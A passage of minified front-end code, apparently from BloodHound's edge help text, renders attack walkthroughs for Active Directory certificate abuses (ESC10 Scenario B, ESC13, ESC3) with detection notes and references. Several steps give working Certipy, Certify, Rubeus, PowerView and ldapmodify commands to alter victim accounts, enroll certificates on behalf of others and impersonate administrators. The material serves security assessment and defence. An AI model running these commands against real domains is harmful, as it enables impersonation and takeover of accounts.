4.",e.jsx("br",{}),e.jsx("br",{}),"If any of the two flags are present, you will need the victim’s mail attribute to be set. The value of the attribute will be included in the issues certificate but it is not used to identify the target principal why it can be set to any arbitrary string.",e.jsx("br",{}),e.jsx("br",{}),"Check if the victim has the mail attribute set using PowerView:"]}),e.jsx(t,{component:"pre",children:"Get-DomainObject -Identity VICTIM -Properties mail"}),e.jsxs(t,{variant:"body2",children:["If the victim has the mail attribute set, continue to Step 4.",e.jsx("br",{}),e.jsx("br",{}),"If the victim does not has the mail attribute set, set it to a dummy mail using PowerView:"]}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Identity VICTIM -Set @{'mail'='dummy@mail.com'}"})]}),s=e.jsxs(l,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 4: "}),"Obtain a session as victim.",e.jsx("br",{}),e.jsx("br",{}),"There are several options for this step.",e.jsx("br",{}),e.jsx("br",{}),"If the victim is a computer, you can obtain the credentials of the computer account using the Shadow Credentials attack (see"," ",e.jsx(n,{target:"blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/add-key-credential-link",children:"AddKeyCredentialLink edge documentation"}),"). Alternatively, you can obtain a session as SYSTEM on the host, which allows you to interact with AD as the computer account, by abusing control over the computer AD object (see"," ",e.jsx(n,{target:"blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/generic-all",children:"GenericAll edge documentation"}),")."]}),e.jsx(t,{variant:"body2",className:r.containsCodeEl,children:"If the victim is a user, you have the following options for obtaining the credentials:"}),e.jsxs(B,{sx:{fontSize:"12px"},children:[e.jsxs(P,{children:["Shadow Credentials attack (see"," ",e.jsx(n,{target:"blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/add-key-credential-link",children:"AddKeyCredentialLink edge documentation"}),")"]}),e.jsxs(P,{children:["Password reset (see"," ",e.jsx(n,{target:"blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/force-change-password",children:"ForceChangePassword edge documentation"}),")"]}),e.jsxs(P,{children:["Targeted Kerberoasting (see"," ",e.jsx(n,{target:"blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/write-spn",children:"WriteSPN edge documentation"}),")"]})]})]}),c=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 5: "}),"Enroll certificate as victim.",e.jsx("br",{}),e.jsx("br",{}),"Use Certipy as the victim principal to request enrollment in the affected template, specifying the affected EnterpriseCA:"]}),e.jsx(t,{component:"pre",children:"Certipy.exe req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target CA-SERVER -template TEMPLATE"}),e.jsx(t,{variant:"body2",children:"The issued certificate will be saved to disk with the name of the targeted user."})]}),d=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 6: "}),"Set UPN of victim to arbitrary value.",e.jsx("br",{}),e.jsx("br",{}),"Set the UPN of the victim principal using Certipy:"]}),e.jsx(t,{component:"pre",children:"Certipy.exe account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM -upn victim@corp.local"})]}),h=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 7: "}),"Perform Schannel authentication as targeted principal against affected DC using certificate.",e.jsx("br",{}),e.jsx("br",{}),"Open an LDAP shell as the victim using Certipy by specifying the certificate created in Step 5 and the IP of an affected DC:"]}),e.jsx(t,{component:"pre",children:"Certipy.exe auth -pfx TARGET.pfx -dc-ip IP -ldap-shell"})]});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"An attacker may perform this attack in the following steps:"}),a,o,i,s,c,d,h]})},ba={general:da,windowsAbuse:ma,linuxAbuse:ha,opsec:pa,references:ua,composition:la},fa=({sourceDBId:r,targetDBId:a,edgeName:o})=>{const{isLoading:i,isError:s,nodesArray:c}=Z({sourceDBId:r,targetDBId:a,edgeName:o,type:V.composition});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The relationship represents the effective outcome of the configuration and relationships between several different objects. All objects involved in the creation of this relationship are listed here:"}),e.jsx(l,{py:1,children:i?e.jsx(H,{variant:"rounded"}):s?e.jsx(K,{severity:"error",children:"Couldn't load edge composition"}):e.jsx(X,{nodes:c})})]})},ya=({sourceName:r,sourceType:a})=>{const o=J();return e.jsxs(t,{variant:"body2",className:o.containsCodeEl,children:[E(a,r)," has the privileges to perform the ADCS ESC10 Scenario B attack against the target domain.",e.jsx("br",{}),e.jsx("br",{}),"The principal has control over a victim computer with permission to enroll on one or more certificate templates, configured to enable certificate authentication, and require the ",e.jsx("code",{children:"dNSHostName"})," of the enrollee included in the Subject Alternative Name (SAN). The victim computer also has enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, and chains up to a root CA for the forest. There is an affected Domain Controller (DC) configured to allow UPN certificate mapping. This setup lets the principal impersonate any AD forest computer without their credentials.",e.jsx("br",{}),e.jsx("br",{}),"The attacker principal can abuse their control over the victim computer to modify the victim computer's"," ",e.jsx("code",{children:"dNSHostName"})," attribute to match the ",e.jsx("code",{children:"dNSHostName"})," of a targeted computer. The attacker principal will then abuse their control over the victim computer to obtain the credentials of the victim computer, or a session as the victim computer, and enroll a certificate as the victim in one of the affected certificate templates. The ",e.jsx("code",{children:"dNSHostName"})," of the victim will be included in the issued certificate under SAN DNS name. The UPN certificate mapping configuration on the affected DCs make it possible to authenticate over Schannel as the targeted computer. The DC will split the SAN DNS name into a computer name and a domain name, confirm that the domain name is correct, and use the computer name appended a $ to identify a computer with matching ",e.jsx("code",{children:"sAMAccountName"})," which the attacker will be authenticated as."]})},ga=()=>{const r=J(),a=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 1: "}),"Remove SPNs including ",e.jsx("code",{children:"dNSHostName"})," on victim.",e.jsx("br",{}),e.jsx("br",{}),"The SPNs of the victim will be automatically updated when you change the ",e.jsx("code",{children:"dNSHostName"}),". AD will not allow the same SPN entry to be set on two accounts. Therefore, you must remove any SPN on the victim account that includes the victim's ",e.jsx("code",{children:"dNSHostName"}),". Remove SPN entries using ldapmodify:"]}),e.jsx(t,{component:"pre",children:'echo -e "dn: VICTIM-DN\\nchangetype: modify\\ndelete: servicePrincipalName\\nservicePrincipalName: SPN" | ldapmodify -x -D "ATTACKER-DN" -w PWD -h DOMAIN-DNS-NAME'})]}),o=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 2: "}),"Set ",e.jsx("code",{children:"dNSHostName"})," of victim computer to targeted computer's"," ",e.jsx("code",{children:"dNSHostName"}),".",e.jsx("br",{}),e.jsx("br",{}),"Set the ",e.jsx("code",{children:"dNSHostName"})," of the victim computer using Certipy:"]}),e.jsx(t,{component:"pre",children:"certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM$ -dns TARGET.CORP.LOCAL"})]}),i=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 3: "}),"Check if ",e.jsx("code",{children:"mail"})," attribute of victim must be set and set it if required.",e.jsx("br",{}),e.jsx("br",{}),"If the certificate template is of schema version 2 or above and its attribute"," ",e.jsx("code",{children:"msPKI-CertificateNameFlag"})," contains the flag ",e.jsx("code",{children:"SUBJECT_REQUIRE_EMAIL"})," and/or"," ",e.jsx("code",{children:"SUBJECT_ALT_REQUIRE_EMAIL"})," then the victim principal must have their ",e.jsx("code",{children:"mail"})," ","attribute set for the certificate enrollment. The CertTemplate BloodHound node will have"," ",e.jsx("em",{children:'"Subject Require Email"'})," or ",e.jsx("em",{children:'"Subject Alternative Name Require Email"'})," set to true if any of the flags are present.",e.jsx("br",{}),e.jsx("br",{}),"If the certificate template is of schema version 1 or does not have any of the email flags, then continue to Step 4.",e.jsx("br",{}),e.jsx("br",{}),"If any of the two flags are present, you will need the victim's mail attribute to be set. The value of the attribute will be included in the issues certificate but it is not used to identify the target principal why it can be set to any arbitrary string.",e.jsx("br",{}),e.jsx("br",{}),"Check if the victim has the mail attribute set using ldapsearch:"]}),e.jsx(t,{component:"pre",children:`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "VICTIM-DN" mail`}),e.jsxs(t,{variant:"body2",children:["If the victim has the mail attribute set, continue to Step 4.",e.jsx("br",{}),e.jsx("br",{}),"If the victim does not has the mail attribute set, set it to a dummy mail using ldapmodify:"]}),e.jsx(t,{component:"pre",children:`echo -e "dn: VICTIM-DN\\nchangetype: modify\\nreplace: mail\\nmail: test@mail.com" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`})]}),s=e.jsx(l,{children:e.jsxs(t,{variant:"body2",sx:{marginBottom:"-8px"},children:[e.jsx("b",{children:"Step 4: "}),"Obtain a session as victim.",e.jsx("br",{}),e.jsx("br",{}),"= There are several options for this step. You can obtain a session as SYSTEM on the host, which allows you to interact with AD as the computer account, by abusing control over the computer AD object (see"," ",e.jsx(n,{target:"blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/generic-all",children:"GenericAll edge documentation"}),")."]})}),c=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 5: "}),"Enroll certificate as victim.",e.jsx("br",{}),e.jsx("br",{}),"Use Certipy as the victim computer to request enrollment in the affected template, specifying the affected EnterpriseCA:"]}),e.jsx(t,{component:"pre",children:"certipy req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target CA-SERVER -template TEMPLATE"}),e.jsx(t,{variant:"body2",children:"The issued certificate will be saved to disk with the name of the targeted computer."})]}),d=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 6 (Optional): "}),"Set ",e.jsx("code",{children:"dNSHostName"})," and SPN of victim to the previous values.",e.jsx("br",{}),e.jsx("br",{}),"To avoid issues in the environment, set the ",e.jsx("code",{children:"dNSHostName"})," and SPN of the victim computer back to its previous values using Certipy and ldapmodify:"]}),e.jsx(t,{component:"pre",children:"certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -dns VICTIM.CORP.LOCAL"}),e.jsx(t,{component:"pre",children:'echo -e "dn: VICTIM-DN\\nchangetype: modify\\nadd: servicePrincipalName\\nservicePrincipalName: SPN" | ldapmodify -x -D "ATTACKER-DN" -w PWD -h DOMAIN-DNS-NAME'})]}),h=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 7: "}),"Perform Schannel authentication as targeted principal against affected DC using certificate.",e.jsx("br",{}),e.jsx("br",{}),"Open an LDAP shell as the victim using Certipy by specifying the certificate created in Step 5 and the IP of an affected DC:"]}),e.jsx(t,{component:"pre",children:"certipy auth -pfx TARGET.pfx -dc-ip IP -ldap-shell"})]});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"An attacker may perform this attack in the following steps:"}),a,o,i,s,c,d,h]})},xa=()=>e.jsx(t,{variant:"body2",children:"When the affected certificate authority issues the certificate to the attacker, it will retain a local copy of that certificate in its issued certificates store. Defenders may analyze those issued certificates to identify illegitimately issued certificates and identify the computer that requested the certificate, as well as the target identity the attacker is attempting to impersonate."}),ja=()=>{const r=[{label:"Certipy 4.0",link:"https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7"},{label:"Certipy",link:"https://github.com/ly4k/Certipy"},{label:"Set-DomainObject",link:"https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject"},{label:"LDAPSearch",link:"https://linux.die.net/man/1/ldapsearch"},{label:"LDAPModify",link:"https://linux.die.net/man/1/ldapmodify"}];return e.jsx(l,{sx:{overflowX:"auto"},children:r.map(a=>e.jsxs(be.Fragment,{children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:a.link,children:a.label}),e.jsx("br",{})]},a.link))})},wa=()=>{const r=J(),a=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 1: "}),"Remove SPNs including ",e.jsx("code",{children:"dNSHostName"})," on victim.",e.jsx("br",{}),e.jsx("br",{}),"The SPNs of the victim will be automatically updated when you change the ",e.jsx("code",{children:"dNSHostName"}),". AD will not allow the same SPN entry to be set on two accounts. Therefore, you must remove any SPN on the victim account that includes the victim's ",e.jsx("code",{children:"dNSHostName"}),". Set SPN of the victim computer using PowerView:"]}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Identity VICTIM -Set @{'serviceprincipalname'='HOST/victim'}"})]}),o=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 2: "}),"Create .exe version of Certipy.",e.jsx("br",{}),e.jsx("br",{}),"Install PyInstaller on a host with python installed, clone down Certipy from GitHub, and run this cmdlet from the root of the GitHub repo to bundle the python project into an .exe binary which can be used on Windows computer where Python is not installed:"]}),e.jsx(t,{component:"pre",children:"pyinstaller ./Certipy.spec"}),e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:["The Certipy.exe will be in the ",e.jsx("code",{children:"dist"})," folder."]})]}),i=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 3: "})," Set ",e.jsx("code",{children:"dNSHostName"})," of victim computer to targeted computer's"," ",e.jsx("code",{children:"dNSHostName"}),".",e.jsx("br",{}),e.jsx("br",{}),"Set ",e.jsx("code",{children:"dNSHostName"})," of the victim principal using Certipy:"]}),e.jsx(t,{component:"pre",children:"Certipy.exe account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM$ -dns TARGET.CORP.LOCAL"})]}),s=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,sx:{marginBottom:"-8px"},children:[e.jsx("b",{children:"Step 4: "}),"Check if ",e.jsx("code",{children:"mail"})," attribute of victim must be set and set it if required.",e.jsx("br",{}),e.jsx("br",{}),"If the certificate template is of schema version 2 or above and its attribute"," ",e.jsx("code",{children:"msPKI-CertificateNameFlag"})," contains the flag ",e.jsx("code",{children:"SUBJECT_REQUIRE_EMAIL"})," and/or"," ",e.jsx("code",{children:"SUBJECT_ALT_REQUIRE_EMAIL"})," then the victim principal must have their mail attribute set for the certificate enrollment. The CertTemplate BloodHound node will have ",e.jsx("em",{children:'"Subject Require Email"'})," ","or ",e.jsx("em",{children:'"Subject Alternative Name Require Email"'})," set to true if any of the flags are present.",e.jsx("br",{}),e.jsx("br",{}),"If the certificate template is of schema version 1 or does not have any of the email flags, then continue to Step 5.",e.jsx("br",{}),e.jsx("br",{}),"If any of the two flags are present, you will need the victim's mail attribute to be set. The value of the attribute will be included in the issues certificate but it is not used to identify the target principal why it can be set to any arbitrary string.",e.jsx("br",{}),e.jsx("br",{}),"Check if the victim has the mail attribute set using PowerView:"]}),e.jsx(t,{component:"pre",children:"Get-DomainObject -Identity VICTIM -Properties mail"}),e.jsxs(t,{variant:"body2",children:["If the victim has the mail attribute set, continue to Step 5.",e.jsx("br",{}),e.jsx("br",{}),"If the victim does not has the mail attribute set, set it to a dummy mail using PowerView:"]}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Identity VICTIM -Set @{'mail'='dummy@mail.com'}"})]}),c=e.jsx(l,{children:e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 5: "}),"Obtain a session or credentials as victim.",e.jsx("br",{}),e.jsx("br",{}),"There are several options for this step.",e.jsx("br",{}),e.jsx("br",{}),"You can obtain a session as SYSTEM on the host, which allows you to interact with AD as the computer account, by abusing control over the computer AD object (see"," ",e.jsx(n,{target:"blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/generic-all",children:"GenericAll edge documentation"}),")."]})}),d=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 6: "}),"Enroll certificate as victim.",e.jsx("br",{}),e.jsx("br",{}),"Use Certipy as the victim principal to request enrollment in the affected template, specifying the affected EnterpriseCA:"]}),e.jsx(t,{component:"pre",children:"Certipy.exe req -u VICTIM$ -p PWD -ca CA-NAME -target CA-SERVER -template TEMPLATE"}),e.jsx(t,{variant:"body2",children:"The issued certificate will be saved to disk with the name of the targeted user."})]}),h=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 7 (Optional): "}),"Set ",e.jsx("code",{children:"dNSHostName"})," and SPN of victim to the previous values.",e.jsx("br",{}),e.jsx("br",{}),"To avoid issues in the environment, set the ",e.jsx("code",{children:"dNSHostName"})," and SPN of the victim computer back to its previous values using Certipy and PowerView:"]}),e.jsx(t,{component:"pre",children:"Certipy.exe account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM$ -dns VICTIM.CORP.LOCAL"}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Identity VICTIM -Set @{'serviceprincipalname'='HOST/victim'}"})]}),u=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 8: "}),"Perform Schannel authentication as targeted principal against affected DC using certificate.",e.jsx("br",{}),e.jsx("br",{}),"Open an LDAP shell as the victim using Certipy by specifying the certificate created in Step 6 and the IP of an affected DC:"]}),e.jsx(t,{component:"pre",children:"Certipy.exe auth -pfx TARGET.pfx -dc-ip IP -ldap-shell"})]});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"An attacker may perform this attack in the following steps:"}),a,o,i,s,c,d,h,u]})},va={general:ya,windowsAbuse:wa,linuxAbuse:ga,opsec:xa,references:ja,composition:fa},Me=({sourceDBId:r,targetDBId:a,edgeName:o})=>{const{isLoading:i,isError:s,nodesArray:c}=Z({sourceDBId:r,targetDBId:a,edgeName:o,type:V.composition});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The relationship represents the effective outcome of the configuration and relationships between several different objects. All objects involved in the creation of this relationship are listed here:"}),e.jsx(l,{py:1,children:i?e.jsx(H,{variant:"rounded"}):s?e.jsx(K,{severity:"error",children:"Couldn't load edge composition"}):e.jsx(X,{nodes:c})})]})},Aa=({sourceName:r,sourceType:a})=>e.jsxs(t,{variant:"body2",children:["The ",a," ",r," has the privileges to perform the ADCS ESC13 abuse against the target AD group. The principal has enrollment rights on a certificate template configured with an issuance policy extension. The issuance policy has an OID group link to an AD group. The principal also has enrollment permission for an enterprise CA with the necessary template published. This enterprise CA is trusted for NT authentication and chains up to a root CA for the forest. This setup allows the principal to enroll a certificate that the principal can use to obtain access to the environment as a member of the group specified in the OID group link."]}),Sa=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"An attacker may perform this attack in the following steps:"}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 1"}),": Use Certipy to request enrollment in the affected template, specifying the affected enterprise CA:"]}),e.jsx(t,{component:"pre",children:"certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC13"}),e.jsx(t,{variant:"body2",children:"If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default."}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 2"}),": Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 1 and the IP of a domain controller:"]}),e.jsx(t,{component:"pre",children:"certipy auth -pfx john.pfx -dc-ip 172.16.126.128"})]}),Ca=()=>e.jsx(t,{variant:"body2",children:"When the affected certificate authority issues the certificate to the attacker, it will retain a local copy of that certificate in its issued certificates store. Defenders may analyze those issued certificates to identify illegitimately issued certificates and identify the principal that requested the certificate."}),ka=()=>{const r=[{label:"Abuse Elevation Control Mechanism",link:"https://attack.mitre.org/techniques/T1548/"},{label:"ADCS ESC13 Abuse Technique",link:"https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53"},{label:"Certified Pre-Owned - Abusing Active Directory Certificate Services",link:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"},{label:"Certipy",link:"https://github.com/ly4k/Certipy"},{label:"Certify",link:"https://github.com/GhostPack/Certify"},{label:"Rubeus",link:"https://github.com/GhostPack/Rubeus"},{label:"Authentication Mechanism Assurance for AD DS in Windows Server 2008 R2 Step-by-Step Guide",link:"https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd378897(v=ws.10)?redirectedfrom=MSDN"},{label:"Use Authentication Mechanism Assurance (AMA) to secure administrative account logins",link:"https://www.gradenegger.eu/en/using-authentication-mechanism-assurance-ama-to-secure-the-login-of-administrative-accounts/"}];return e.jsx(l,{sx:{overflowX:"auto"},children:r.map(a=>e.jsxs(be.Fragment,{children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:a.link,children:a.label}),e.jsx("br",{})]},a.link))})},Ta=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The principal can now perform an ESC13 abuse with the following steps:"}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 1"}),": Use Certify (2.0) to request enrollment in the affected template, specifying the affected certification authority:"]}),e.jsx(t,{component:"pre",children:"Certify.exe request --ca rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA --template ESC13"}),e.jsx(t,{variant:"body2",children:"If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default."}),e.jsx(t,{variant:"body2",children:"The certificate PFX is printed to the console in a base64-encoded format."}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 2"}),": With Rubeus, use the certificate to authenticate to the domain and request a TGT, specifying the identity you intend to impersonate:"]}),e.jsx(t,{component:"pre",children:"Rubeus asktgt /user:attacker /domain:forestroot.com /certificate:<cert base64> /ptt"}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 3"}),": Optionally verify the TGT by listing it with the klist command:"]}),e.jsx(t,{component:"pre",children:"klist"})]}),Pa={general:Aa,windowsAbuse:Ta,linuxAbuse:Sa,opsec:Ca,references:ka,composition:Me},Da=({sourceDBId:r,targetDBId:a,edgeName:o})=>{const{isLoading:i,isError:s,nodesArray:c}=Z({sourceDBId:r,targetDBId:a,edgeName:o,type:V.composition});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The relationship represents the effective outcome of the configuration and relationships between several different objects. All objects involved in the creation of this relationship are listed here:"}),e.jsx(l,{py:1,children:i?e.jsx(H,{variant:"rounded"}):s?e.jsx(K,{severity:"error",children:"Couldn't load edge composition"}):e.jsx(X,{nodes:c})})]})},Oa=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," the capability to perform the ADCS ESC3 attack against the domain ",o,"."]}),e.jsx(t,{variant:"body2",children:"The principal has permission to enroll on a certificate allowing them to obtain an enrollment agent certificate. They also have permission to enroll for a certificate template that permits enrollment by enrollment agents and can be used for authentication. Additionally, they also have enrollment permissions for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, along with the CA certificate chain up to the root CA certificate. This setup lets the principal enroll certificates for any AD forest user or computer, enabling authentication and impersonation of any AD forest user or computer without their credentials, unless the target user or computer is protected by enrollment agent restrictions on the enterprise CA."})]}),Ra=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The ESC3 attack can be carried out in the following manner."}),e.jsxs(t,{variant:"body2",children:[e.jsx(l,{component:"span",sx:{fontWeight:"bold"},children:"Step 1:"})," ","Use Certipy to request an enrollment agent certificate."]}),e.jsx(t,{component:"pre",children:"certipy req -u 'user@corp.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template'"}),e.jsx(t,{variant:"body2",children:"If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default."}),e.jsxs(t,{variant:"body2",children:[e.jsx(l,{component:"span",sx:{fontWeight:"bold"},children:"Step 2:"})," ","Use the enrollment agent certificate to issue a certificate request on behalf of another user to a certificate template that allow for authentication and permit enrollment agent enrollment."]}),e.jsx(t,{component:"pre",children:"certipy req -u 'user@corp.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'User' -on-behalf-of 'contoso\\administrator' -pfx 'user.pfx'"}),e.jsx(t,{variant:"body2",children:"If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the target principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. Choose another target with the given attribute set."}),e.jsxs(t,{variant:"body2",children:[e.jsx(l,{component:"span",sx:{fontWeight:"bold"},children:"Step 3:"})," ","Request a ticket granting ticket (TGT) from the domain, specifying the target identity to impersonate and the PFX-formatted certificate created in Step 2."]}),e.jsx(t,{component:"pre",children:"certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128"})]}),Ea=()=>e.jsx(t,{variant:"body2",children:"When the affected certificate authority issues the certificate to the attacker, it will retain a local copy of that certificate in its issued certificates store. Defenders may analyze those issued certificates to identify illegitimately issued certificates and identify the principal that requested the certificate, as well as the target identity the attacker is attempting to impersonate. Defenders can also monitor for certificate requests using the Certificate Request Agent EKU or other suspicious templates. Another detection option would be searching authentication attempts being made with certificates containing ANY EKU with no Client Authentication."}),Ia=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1649/",children:"https://attack.mitre.org/techniques/T1649/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/GhostPack/Certify",children:"https://github.com/GhostPack/Certify"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ly4k/Certipy",children:"https://github.com/ly4k/Certipy"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-cersod/97f47d4c-2901-41fa-9616-96b94e1b5435",children:"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-cersod/97f47d4c-2901-41fa-9616-96b94e1b5435"})]}),$a=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The ESC3 attack can be carried out in the following manner."}),e.jsxs(t,{variant:"body2",children:[e.jsx(l,{component:"span",sx:{fontWeight:"bold"},children:"Step 1:"})," ","Use Certify (2.0) to request an enrollment agent certificate."]}),e.jsx(t,{component:"pre",children:"Certify.exe request --ca ca01.corp.local\\CORP-CA01-CA --template Vuln-EnrollmentAgent"}),e.jsx(t,{variant:"body2",children:"If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default."}),e.jsx(t,{variant:"body2",children:"The certificate PFX is printed to the console in a base64-encoded format."}),e.jsxs(t,{variant:"body2",children:[e.jsx(l,{component:"span",sx:{fontWeight:"bold"},children:"Step 2:"})," ","Use the enrollment agent certificate to issue a certificate request on behalf of another user to a certificate template that allow for authentication and permit enrollment agent enrollment."]}),e.jsx(t,{component:"pre",children:"Certify.exe request-agent --ca ca01.corp.local\\CORP-CA01-CA --template User --target Administrator --agent-pfx <cert base64>"}),e.jsx(t,{variant:"body2",children:"The certificate PFX is printed to the console in a base64-encoded format."}),e.jsx(t,{variant:"body2",children:"If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the target principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. Choose another target with the given attribute set."}),e.jsxs(t,{variant:"body2",children:[e.jsx(l,{component:"span",sx:{fontWeight:"bold"},children:"Step 3:"})," ","With Rubeus, use the certificate to authenticate to the domain and request a TGT, specifying the identity you intend to impersonate:"]}),e.jsx(t,{component:"pre",children:"Rubeus asktgt /user:Administrator /domain:corp.local /certificate:<cert base64> 